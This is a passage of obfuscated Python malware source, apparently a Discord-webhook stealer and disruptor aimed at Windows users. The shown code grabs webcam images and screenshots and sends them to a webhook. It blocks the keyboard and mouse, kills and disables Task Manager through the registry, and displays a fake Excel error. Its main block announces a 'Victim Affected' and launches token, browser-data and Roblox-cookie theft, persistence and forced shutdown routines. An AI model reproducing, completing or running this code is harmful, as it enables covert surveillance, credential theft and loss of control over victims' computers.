            GQMOIWRDBCDTDPZIOSRVLSNDPSDODJDVTIPDFBTLSTSFKVNHBFPOGRKJEHELNIQAMVAEUFFWGZMGYYEQYCWBMWRSFOBAWMG.release()
            v4r_out.release()
            Clear()

        try:
            MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{ZRKYAFTIWRHLPRJPWXAIMNQDOBAHXDTFLWOWISJXYZCIMZEKVVUPLWWXCDTZERWYYESF}"
            c4ptur3(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture)
        except:
            MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture = ZRKYAFTIWRHLPRJPWXAIMNQDOBAHXDTFLWOWISJXYZCIMZEKVVUPLWWXCDTZERWYYESF
            c4ptur3(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture)

        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC = Embed(title=f"Camera Capture `{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ} \"{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}\"`:", color=ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU, description=f"```└── 📷 - {ZRKYAFTIWRHLPRJPWXAIMNQDOBAHXDTFLWOWISJXYZCIMZEKVVUPLWWXCDTZERWYYESF}```")
        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC.set_footer(text=EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE, icon_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP)

        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ = SyncWebhook.from_url(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM)
        with open(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture, "rb") as f:
            CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ.send(
                embed=NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC,
                file=File(f, filename=ZRKYAFTIWRHLPRJPWXAIMNQDOBAHXDTFLWOWISJXYZCIMZEKVVUPLWWXCDTZERWYYESF),
                username=PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER,
                avatar_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP
            )
            
        if os.path.exists(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture):
            os.remove(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_capture)
        Clear()
    except:
        Clear()
        pass

def Scr33n5h0t():
    import os
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File

    try:
        NYNWBDTOPVFQIBYLXWYKBTWUQGZIGMSCRNPRNPUIEDUVCKZAXBYYWXAUJSSDRDXEDFMMBXGYCDEJNPBBBZWTELKECFFHUOXOOCRP = f"Screenshot_{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ}.png"

        def capture(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG):
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            v4r_image.save(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG)
        
        try:
            MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen = f"{os.path.join(os.environ.get('USERPROFILE'), 'Documents')}\\{NYNWBDTOPVFQIBYLXWYKBTWUQGZIGMSCRNPRNPUIEDUVCKZAXBYYWXAUJSSDRDXEDFMMBXGYCDEJNPBBBZWTELKECFFHUOXOOCRP}"
            capture(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen)
        except:
            MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen = NYNWBDTOPVFQIBYLXWYKBTWUQGZIGMSCRNPRNPUIEDUVCKZAXBYYWXAUJSSDRDXEDFMMBXGYCDEJNPBBBZWTELKECFFHUOXOOCRP
            capture(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen)

        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC = Embed(title=f"Screenshot `{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ} \"{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}\"`:", color=ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU)
        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC.set_image(url=f"attachment://{NYNWBDTOPVFQIBYLXWYKBTWUQGZIGMSCRNPRNPUIEDUVCKZAXBYYWXAUJSSDRDXEDFMMBXGYCDEJNPBBBZWTELKECFFHUOXOOCRP}")
        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC.set_footer(text=EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE, icon_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP )
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ = SyncWebhook.from_url(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM)
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ.send(
                embed=NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC,
                file=File(f'{MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen}', filename=NYNWBDTOPVFQIBYLXWYKBTWUQGZIGMSCRNPRNPUIEDUVCKZAXBYYWXAUJSSDRDXEDFMMBXGYCDEJNPBBBZWTELKECFFHUOXOOCRP),
                username=PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER,
                avatar_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP
            )

        if os.path.exists(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen):
            os.remove(MOGGATQWVDOHSDCNVNTJOYOPEEPABCHLDTXLWPWLYABJMFZZJPGPCUYBSGYZEDKEZHEQMLKULCAVEGOMMLUBMAG_file_screen)
    except Exception as e:
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ = SyncWebhook.from_url(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM)
        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC = Embed(
            title=f'Screenshot `{KUDPSZMKELHVTEPPHZWHRFLSXSBZZVLLVDCCHWYVFTNCIFVQJGTMRNCDEORTCGMZETMBBNVWDCNTSCFEXZ} "{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}"`:', 
            description=f"Impossible to take screenshot.\n**Error:** `{e}`",
            color=ZJQSCZNFABWTTCTHNEROXLYDNUXYWZWEYFMQSUYYYZUXZQEKCUEBU)
        NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC.set_footer(text=EQKWKSYZNWWEERHCPRYDHPDLHLJXVJVEKMQWBMSQAIQVUSUOJEQQBQRCNYBYDEEMEAOMEFOWMCWPXXUXE, icon_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP)
        CDJGKMNDPYCRWAIORTRRUVKSMSQEGVKXHTOFOIFWBAUVQNJWVOMAWJ.send(embed=NPAMMYCSIUWMJAUXZXCRWEPPVQPRJXIQOHWVDUOHSKMUHMSYAVSKFRWJJKJWVJNFAHMAJQC, username=PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER, avatar_url=EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP)

def B10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def Unb10ck_K3y():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def B10ck_M0u53():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def B10ck_T45k_M4n4g3r():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True)
    Clear()

def F4k3_3rr0r():
    import tkinter as tk
    from tkinter import messagebox
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Microsoft Excel", "The file is corrupt and cannot be opened.")

def Sp4m_Opti0ns():
    import keyboard
    while True:
        try:
            B10ck_M0u53()
            Sp4m_0p3n_Pr0gr4m()
            Sp4m_Cr34t_Fil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

try: requests.post(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER, 'avatar_url': EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP,})
except: pass
try: threading.Thread(target=B10ck_K3y).start()
except: pass
try: threading.Thread(target=B10ck_T45k_M4n4g3r).start()
except: pass
try: threading.Thread(target=B10ck_W3b5it3).start()
except: pass
try: threading.Thread(target=St4rtup).start()
except: pass
try: Sy5t3m_Inf0()
except: pass
try: Di5c0rd_T0k3n()
except: pass
try: Di5c0rd_inj3c710n()
except: pass
try: Br0w53r_5t341()
except: pass
try: R0b10x_C00ki3()
except: pass
try: C4m3r4_C4ptur3()
except: pass
try: Op3n_U53r_Pr0fi13_53tting5()
except: pass
try: Scr33n5h0t()
except: pass
try: requests.post(VNUQGLLFFWQKTFMBPEWBBQEXUGTDSOPPDHYZGTEXOKPHLLJCMKXKXUZCWMCZQLJLWXHJGKPXGSYMMTSKEFOIZM, json={'content': f'****╚══════════════════{ENCFWDCTDTNOBRFRJTPNHGLQXUVKHAPPFPPBZHGRMCUHXBJLFUVHBIWIONMWHHVQPSCTBWZPQOGFBCZKHNSDUIYQXBV}══════════════════╝****', 'username': PLQGNCIXLRJNBHSLTCFMOMZZUFODSVVFETFDRKHLJUXJVKLHOER, 'avatar_url': EYWGOEBDUKMJUOZRVNILEDDRUTOSHGOTSKSRNIOYDGTRCMHVSOPFEIJFFSLNPAFZCQFJAIPFLQGHYWP})
except: pass
try: threading.Thread(target=Sp4m_Opti0ns).start()
except: pass
try: threading.Thread(target=R3st4rt).start()
except: pass
try: threading.Thread(target=F4k3_3rr0r).start()
except: pass
try: threading.Thread(target=Shutd0wn).start()
except: pass
Clear()
